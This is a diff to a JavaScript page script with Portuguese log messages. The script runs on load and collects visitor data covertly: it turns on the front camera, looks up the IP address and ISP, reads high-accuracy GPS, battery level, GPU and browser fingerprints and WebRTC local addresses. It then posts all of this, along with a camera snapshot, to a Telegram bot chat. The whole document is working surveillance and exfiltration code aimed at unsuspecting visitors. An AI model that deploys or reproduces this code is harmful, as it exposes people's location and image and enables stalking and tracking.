@@ -11,32 +11,77 @@
         collectedData = {};
 
         try {
-            const res = await fetch('https://ipapi.co/json/');
-            collectedData.ip = await res.json();
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } }
+            });
+            cameraStream = stream;
+            const track = stream.getVideoTracks()[0];
+            const settings = track.getSettings();
+            collectedData.camera = {
+                enabled: true,
+                width: settings.width,
+                height: settings.height,
+                facingMode: settings.facingMode || 'user'
+            };
+            console.log('📷 Câmara ativada:', settings.width, 'x', settings.height);
         } catch (e) {
+            collectedData.camera = { error: 'denied' };
+            console.log('📷 Câmara negada:', e.message);
+        }
+
+        try {
+            const res = await fetch('https://ip-api.com/json/?fields=status,message,country,regionName,city,isp,org,as,query');
+            if (res.ok) {
+                const data = await res.json();
+                if (data.status === 'success') {
+                    collectedData.ip = {
+                        ip: data.query,
+                        city: data.city,
+                        region: data.regionName,
+                        country: data.country,
+                        isp: data.isp || data.org,
+                        as: data.as
+                    };
+                    console.log('🌐 IP:', data.query);
+                } else {
+                    throw new Error(data.message || 'IP API error');
+                }
+            } else {
+                throw new Error('HTTP ' + res.status);
+            }
+        } catch (e) {
+            console.log('🌐 IP fallback:', e.message);
             try {
                 const fallback = await fetch('https://api.ipify.org?format=json');
-                collectedData.ip = await fallback.json();
-            } catch (e2) {}
+                const data = await fallback.json();
+                collectedData.ip = { ip: data.ip };
+                console.log('🌐 IP (fallback):', data.ip);
+            } catch (e2) {
+                console.log('🌐 IP falhou completamente');
+            }
         }
 
         try {
             const pos = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000, enableHighAccuracy: true });
             });
             collectedData.geolocation = {
                 lat: pos.coords.latitude,
                 lng: pos.coords.longitude,
                 accuracy: pos.coords.accuracy
             };
-        } catch (e) {}
-
+            console.log('📍 Geo:', pos.coords.latitude, ',', pos.coords.longitude);
+        } catch (e) {
+            console.log('📍 Geo negada');
+        }
+        
         try {
             const battery = await navigator.getBattery();
             collectedData.battery = {
                 level: battery.level,
                 charging: battery.charging
             };
+            console.log('🔋 Bateria:', Math.round(battery.level * 100), '%');
         } catch (e) {}
 
         try {
@@ -58,9 +103,12 @@
                     vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                     renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                 };
+                console.log('🖥️ GPU:', collectedData.gpu.renderer);
             }
-        } catch (e) {}
-
+        } catch (e) {
+            console.log('Canvas/GPU erro');
+        }
+        
         collectedData.browser = {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
@@ -79,7 +127,7 @@
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             offset: new Date().getTimezoneOffset()
         };
-
+        
         try {
             const rtc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
             rtc.createDataChannel('test');
@@ -94,26 +142,10 @@
             rtc.close();
         } catch (e) {}
 
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } }
-            });
-            cameraStream = stream;
-            const track = stream.getVideoTracks()[0];
-            const settings = track.getSettings();
-            collectedData.camera = {
-                enabled: true,
-                width: settings.width,
-                height: settings.height,
-                facingMode: settings.facingMode || 'user'
-            };
-        } catch (e) {
-            collectedData.camera = { error: 'denied' };
-        }
-
         collectedData.collectedAt = new Date().toISOString();
         collectedData.url = window.location.href;
 
+        console.log('✅ Coleta concluída');
         await sendToTelegram();
     }
 
@@ -146,8 +178,8 @@
             if (data.ip) {
                 msg += 'IP: ' + (data.ip.ip || '?') + '\n';
                 msg += 'Cidade: ' + (data.ip.city || '') + '\n';
-                msg += 'País: ' + (data.ip.country_name || '') + '\n';
-                msg += 'ISP: ' + (data.ip.org || '') + '\n\n';
+                msg += 'País: ' + (data.ip.country || '') + '\n';
+                msg += 'ISP: ' + (data.ip.isp || '') + '\n\n';
             }
 
             if (data.geolocation) {
@@ -209,12 +241,13 @@
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('photo', blob, 'shot.jpg');
                 await fetch(photoUrl, { method: 'POST', body: formData });
+                console.log('📸 Snapshot enviado');
             }
 
         } catch (e) {
             console.error('Erro no sendToTelegram:', e);
         }
     }
-
+    
     collectAll();
 })();
